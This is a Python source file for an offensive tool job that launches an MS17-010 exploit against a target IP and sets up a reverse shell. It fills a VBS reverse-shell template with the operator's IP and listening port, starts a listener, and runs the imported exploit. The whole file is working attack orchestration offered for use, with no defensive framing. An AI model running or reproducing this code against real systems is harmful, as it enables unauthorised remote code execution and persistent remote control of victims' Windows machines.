from shell_control.shell_control_job import ShellControlJob
from ms1710.zzz_exploit import exploit
from ms1710.listener import MS1710Listener
import re


class MS1710ReverseShellCommand(ShellControlJob):
    def __init__(self, command_id):
        super(MS1710ReverseShellCommand, self).__init__(command_id)
        self.is_exploit_running = False
        self.reverse_listener = None

    def __listener_data_callback(self, data):
        self.notify_event('listener_data', {'data': data})

    def __prepare_reverse_shell_script(self, listening_port):
        # Read the template
        with open('../assets/reverse_shell_template.vbs', 'r') as template_file:
            reverse_shell_template = template_file.read()
            reverse_shell_template = re.sub('<ATTACKER_LISTEN_IP>', get_computer_ip(), reverse_shell_template)
            reverse_shell_template = re.sub('<ATTACKER_LISTEN_PORT>', str(listening_port), reverse_shell_template)

            # Write the output file to the ms1710 dir
            with open('../ms1710/reverse_shell.vbs', 'w') as reverse_file:
                reverse_file.write(reverse_shell_template)

    def __start_reverse_shell_listener(self, listening_port):
        self.reverse_listener = MS1710Listener(port=listening_port, data_callback=self.__listener_data_callback)
        self.reverse_listener.start_listen()

    def __stop_reverse_shell_listener(self):
        if self.reverse_listener:
            self.reverse_listener.stop_listen()

    def execute_job(self, command_args, log_stream):
        if not command_args or not all(elem in ['target', 'listening_port'] for elem in command_args.keys()):
            log_stream.error('Invalid args for job')
            return

        target_ip = command_args['target']
        listening_port = command_args['listening_port']
        self.__prepare_reverse_shell_script(listening_port)
        self.__start_reverse_shell_listener(listening_port)
        log_stream.debug('Selected IP to attack = ' + target_ip)
        self.is_exploit_running = True
        if exploit(target=target_ip):
            log_stream.debug("Exploit Succ!")
        else:
            log_stream.warn("Exploit Failure")
            self.__stop_reverse_shell_listener()

    def is_job_running(self):
        return self.is_exploit_running

    def cancel_job(self):
        if self.reverse_listener:
            self.__stop_reverse_shell_listener()


if __name__ == '__main__':
    from shell_control.shell_control import ShellControl
    from utils.ip_utils import get_computer_ip

    with ShellControl() as shell_control:
        id = shell_control.add_shell_flow_command('MS1710ReverseShell', 'MS1710RS', MS1710ReverseShellCommand, False)
        shell_control.execute_shell_flow_commannd(id, {'target': get_computer_ip(), 'listening_port': 4444})
        # shell_control.wait_for_shell_job_to_end(job_id)